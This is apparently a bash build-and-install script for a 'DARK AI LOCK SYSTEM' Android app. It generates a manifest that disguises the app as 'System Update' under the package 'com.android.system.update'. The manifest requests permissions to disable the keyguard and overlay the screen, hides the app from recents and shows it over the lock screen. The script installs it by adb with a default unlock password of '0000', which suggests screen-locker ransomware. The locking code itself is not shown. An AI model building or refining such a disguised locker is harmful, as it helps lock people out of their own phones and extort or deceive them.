#!/bin/bash

# DARK AI Web-to-APK Setup Script
# Version: 5.0

echo "╔══════════════════════════════════════════════╗"
echo "║   DARK AI LOCK SYSTEM - INSTALLATION        ║"
echo "╚══════════════════════════════════════════════╝"

# Check requirements
if ! command -v python3 &> /dev/null; then
    echo "[-] Python3 not found! Installing..."
    apt-get update && apt-get install -y python3 python3-pip
fi

if ! command -v adb &> /dev/null; then
    echo "[-] ADB not found! Installing..."
    apt-get install -y android-tools-adb
fi

# Create project structure
echo "[+] Creating project structure..."
mkdir -p DARK_AI_LOCK_PROJECT/{web_content,server,android_app,scripts}

# Copy web files
echo "[+] Setting up web content..."
cp -r web_content/* DARK_AI_LOCK_PROJECT/web_content/

# Setup Python server
echo "[+] Setting up Python server..."
cd DARK_AI_LOCK_PROJECT/server
python3 -m venv venv
source venv/bin/activate
pip install flask flask-cors

# Create Android project
echo "[+] Preparing Android project..."
cd ../android_app

# Create minimal Android project structure
mkdir -p app/src/main/{java/com/darkai/lockapp,assets,res}
mkdir -p app/src/main/res/layout

# Copy Java files
cp ../../webview_app/*.java app/src/main/java/com/darkai/lockapp/

# Copy web content to assets
cp -r ../../web_content/* app/src/main/assets/

# Create build.gradle
cat > build.gradle << 'EOF'
apply plugin: 'com.android.application'

android {
    compileSdkVersion 33
    defaultConfig {
        applicationId "com.android.system.update"
        minSdkVersion 21
        targetSdkVersion 33
        versionCode 5
        versionName "5.0"
    }
    buildTypes {
        release {
            minifyEnabled true
            proguardFiles getDefaultProguardFile('proguard-android.txt'), 'proguard-rules.pro'
        }
    }
}

dependencies {
    implementation 'androidx.appcompat:appcompat:1.6.1'
}
EOF

# Create AndroidManifest.xml
cat > app/src/main/AndroidManifest.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.android.system.update">

    <uses-permission android:name="android.permission.WAKE_LOCK" />
    <uses-permission android:name="android.permission.DISABLE_KEYGUARD" />
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />

    <application
        android:allowBackup="false"
        android:icon="@mipmap/ic_launcher"
        android:label="System Update"
        android:theme="@android:style/Theme.DeviceDefault.Light.NoActionBar.Fullscreen">
        
        <activity android:name=".MainActivity"
            android:launchMode="singleTask"
            android:excludeFromRecents="true"
            android:showOnLockScreen="true"
            android:showWhenLocked="true"
            android:turnScreenOn="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
        
        <service android:name=".LockService"
            android:enabled="true"
            android:exported="false" />
    </application>
</manifest>
EOF

echo "[+] Building APK..."
chmod +x gradlew
./gradlew assembleDebug

if [ -f app/build/outputs/apk/debug/app-debug.apk ]; then
    echo "[✓] APK built successfully!"
    echo "[!] APK location: $(pwd)/app/build/outputs/apk/debug/app-debug.apk"
    
    # Install to connected device
    echo "[?] Install to connected device? (y/n)"
    read -r install_choice
    if [[ "$install_choice" =~ ^[Yy]$ ]]; then
        adb install app/build/outputs/apk/debug/app-debug.apk
        echo "[✓] Installation complete!"
        echo "[!] Default unlock password: 0000"
    fi
else
    echo "[-] APK build failed!"
fi

echo ""
echo "╔══════════════════════════════════════════════╗"
echo "║   INSTALLATION COMPLETE                     ║"
echo "║                                             ║"
echo "║   To start Python server:                   ║"
echo "║     cd server && python3 server.py          ║"
echo "║                                             ║"
echo "║   To rebuild APK:                           ║"
echo "║     cd android_app && ./gradlew assembleDebug║"
echo "╚══════════════════════════════════════════════╝"